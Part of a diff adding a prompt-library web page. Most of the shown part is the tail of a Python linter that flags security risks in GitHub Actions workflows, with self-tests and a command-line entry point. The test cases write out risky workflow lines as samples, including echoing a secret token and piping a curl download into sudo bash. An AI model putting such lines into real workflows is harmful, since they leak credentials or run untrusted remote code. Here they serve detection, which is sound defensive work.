+    ok(&quot;write-all is GHA006&quot;, (&quot;GHA006&quot;, &quot;high&quot;) in rules(SAFE.replace(&quot;permissions:\n  contents: read&quot;, &quot;permissions: write-all&quot;)))
+    ok(&quot;echoed secret is GHA007 high&quot;, (&quot;GHA007&quot;, &quot;high&quot;) in rules(SAFE.replace(&quot;make test&quot;, &quot;echo ${{ secrets.NPM_TOKEN }}&quot;)))
+    ok(&quot;inline secret is GHA007 medium&quot;, (&quot;GHA007&quot;, &quot;medium&quot;) in rules(SAFE.replace(&quot;make test&quot;, &quot;npm publish --token ${{ secrets.NPM_TOKEN }}&quot;)))
+    ok(&quot;curl | bash is GHA008&quot;, (&quot;GHA008&quot;, &quot;medium&quot;) in rules(SAFE.replace(&quot;make test&quot;, &quot;curl -fsSL https://x.sh | sudo bash&quot;)))
+    ok(&quot;self-hosted on PR is GHA009&quot;, (&quot;GHA009&quot;, &quot;medium&quot;) in rules(SAFE.replace(&quot;ubuntu-latest&quot;, &quot;[self-hosted, linux]&quot;)))
+    ok(&quot;self-hosted on push is fine&quot;, rules(SAFE.replace(&quot;pull_request:&quot;, &quot;push:&quot;).replace(&quot;ubuntu-latest&quot;, &quot;self-hosted&quot;)) == [])
+    ok(&quot;unsecure commands is GHA010&quot;, (&quot;GHA010&quot;, &quot;high&quot;) in rules(SAFE.replace(&quot;PR_TITLE: ${{ github.event.pull_request.title }}&quot;, &quot;ACTIONS_ALLOW_UNSECURE_COMMANDS: true&quot;)))
+    ok(&quot;checkout without persist-credentials is GHA011&quot;, (&quot;GHA011&quot;, &quot;low&quot;) in rules(SAFE.replace(&quot;        with:\n          persist-credentials: false\n&quot;, &quot;&quot;)))
+    ok(&quot;missing timeout is GHA012&quot;, (&quot;GHA012&quot;, &quot;low&quot;) in rules(SAFE.replace(&quot;    timeout-minutes: 15\n&quot;, &quot;&quot;)))
+    ok(&quot;docker tag is GHA013&quot;, (&quot;GHA013&quot;, &quot;low&quot;) in rules(SAFE.replace(&quot;actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0&quot;, &quot;docker://alpine:3.20&quot;)))
+    prt = SAFE.replace(&quot;pull_request:&quot;, &quot;pull_request_target:&quot;).replace(&quot;persist-credentials: false&quot;, &quot;persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}&quot;)
+    ok(&quot;pull_request_target + head checkout is GHA001&quot;, (&quot;GHA001&quot;, &quot;high&quot;) in rules(prt))
+    ok(&quot;pull_request + head checkout is not GHA001&quot;, not any(r == &quot;GHA001&quot; for r, _ in rules(SAFE.replace(&quot;persist-credentials: false&quot;, &quot;persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}&quot;))))
+    wr = SAFE.replace(&quot;pull_request:&quot;, &quot;workflow_run:\n    workflows: [CI]&quot;).replace(&quot;      - name: Test&quot;, &quot;      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5\n      - name: Test&quot;)
+    ok(&quot;workflow_run + download-artifact is GHA014&quot;, (&quot;GHA014&quot;, &quot;medium&quot;) in rules(wr))
+    ok(&quot;comment with # in string kept&quot;, strip_comment(&#x27;run: echo &quot;a # b&quot; # note&#x27;) == &#x27;run: echo &quot;a # b&quot;&#x27;)
+    md = to_markdown([audit_text(inj, &quot;ci.yml&quot;)])
+    ok(&quot;markdown lists file and rule&quot;, &quot;## ci.yml&quot; in md and &quot;GHA002&quot; in md)
+    passed = sum(c for _, c in cases)
+    for name, c in cases:
+        print((&quot;PASS &quot; if c else &quot;FAIL &quot;) + name)
+    print(f&quot;{passed}/{len(cases)} passed&quot;)
+    return 0 if passed == len(cases) else 1
+
+
+def main(argv=None):
+    ap = argparse.ArgumentParser(description=&quot;Lint GitHub Actions workflow files for security risks.&quot;)
+    ap.add_argument(&quot;files&quot;, nargs=&quot;*&quot;, help=&quot;workflow .yml files (&#x27;-&#x27; for stdin)&quot;)
+    ap.add_argument(&quot;--json&quot;, action=&quot;store_true&quot;)
+    ap.add_argument(&quot;--strict&quot;, action=&quot;store_true&quot;, help=&quot;exit 1 on any finding&quot;)
+    ap.add_argument(&quot;--self-test&quot;, action=&quot;store_true&quot;)
+    a = ap.parse_args(argv)
+    if a.self_test:
+        return self_test()
+    if not a.files:
+        ap.error(&quot;at least one workflow file required (or --self-test)&quot;)
+    results = []
+    for p in a.files:
+        try:
+            text = sys.stdin.read() if p == &quot;-&quot; else open(p, encoding=&quot;utf-8&quot;).read()
+        except OSError as e:
+            print(f&quot;error: {e}&quot;, file=sys.stderr)
+            return 2
+        results.append(audit_text(text, p))
+    print(json.dumps(results, indent=2) if a.json else to_markdown(results))
+    allf = [f for r in results for f in r[&quot;findings&quot;]]
+    if any(f[&quot;severity&quot;] == &quot;high&quot; for f in allf) or (a.strict and allf):
+        return 1
+    return 0
+
+
+if __name__ == &quot;__main__&quot;:
+    sys.exit(main())</pre>
+  <div class="btns"><button class="btn" type="button" data-copyl>Copy prompt</button></div>
+  <p class="mut">Not reviewed by <a href="/council/">the council</a> yet. Read a prompt before you paste it.</p>
+ </div>
+</section>
+<section class="sec share" id="improve" aria-labelledby="imp-h">
+ <div class="wrap">
+  <h2 id="imp-h">Improve this prompt</h2>
+  <p class="lead">No account needed. Paste your version on the left. On the right, just talk about it: what it does better and which pitfalls it fixes.</p>
+  <div class="btns"><button class="btn ghost" type="button" id="startfrom">Start from this prompt</button></div>
+  <div class="pane2">
+ <div class="pane"><label class="lbl" for="imp-p">Your version of this prompt</label><textarea class="ta" id="imp-p" placeholder="Paste your version here, or press Start from this prompt."></textarea></div>
+ <div class="pane"><label class="lbl" for="imp-t">Talk about it</label><textarea class="ta talk" id="imp-t" placeholder="What does your version do better? Which pitfalls does it fix?"></textarea><div class="microw"><button class="mic" type="button" data-mic="imp-t" data-st="imp-st"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5.5 11a6.5 6.5 0 0 0 13 0M12 17.5V21M8.5 21h7"/></svg></button><p class="st" id="imp-st" role="status" aria-live="polite">Tap the microphone and talk, or type.</p></div></div>
+</div>
+<div id="imp-sub"></div>
+
+  <p class="mut">Improvements are published under CC BY 4.0. Do not paste anything private.</p>
+ </div>
+</section>
+</main>
+<footer class="foot">
+ <div class="wrap">
+  <h2>claudebomb</h2>
+  <p class="mut">A prompt so big it needs its own website. The prompts on this site are free to use, share, and change under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>: credit claudebomb.com. Source and every change on <a href="https://github.com/AtlasJumped/claudebomb.com">GitHub</a>.</p>
+  <p class="mut">Part of the <a href="https://hmrfamily.life">HMR family</a> of websites. Personal dashboard: <a href="https://personaldash.life">personaldash.life</a>. Work dashboard: <a href="https://workdash.life">workdash.life</a>.</p>
+  <p class="mut">Prompts give general help, not legal, medical, or financial advice. Read a prompt before you paste it, and check what your AI does.</p>
+ </div>
+</footer>
+<div class="toast" id="toast" role="status"></div>
+<script src="/assets/cb.js?v=4"></script>
+<script>
+(function(){var C=window.CB,T=document.getElementById('pt').textContent,K='pc/github-actions-workflow-security-reviewer',TI="GitHub Actions Workflow Security Reviewer";
+Array.prototype.forEach.call(document.querySelectorAll('[data-copyl]'),function(b){b.addEventListener('click',function(){C.copyText(T).then(C.copied)})});
+var ip=document.getElementById('imp-p'),it=document.getElementById('imp-t');C.keep(ip,'cb-imp-p-'+K);C.keep(it,'cb-imp-t-'+K);
+document.getElementById('startfrom').addEventListener('click',function(){ip.value=T;ip.dispatchEvent(new Event('input'));ip.focus()});
+C.submitPair(document.getElementById('imp-sub'),{kind:'prompt improvement',empty:'Paste your version, or talk about it, first.',text:function(){var a=ip.value.trim(),b=it.value.trim();if(!a&&!b)return'';return'Improvement for library prompt: '+TI+' (https://claudebomb.com/l/'+K+'/)\n\nWhat they said:\n'+(b||'(nothing)')+'\n\nTheir version:\n'+(a||'(none pasted)')},details:function(){return{library:K}},onSent:function(){ip.value=it.value='';C.ls('cb-imp-p-'+K,null);C.ls('cb-imp-t-'+K,null)}});
+})();
+</script>
+<script src="/v6/funsies.js?v=1" defer></script>
+<script src="/hmr-dock.js?v=6.5.9" data-site="claudebomb.com" defer></script>
+</body></html>
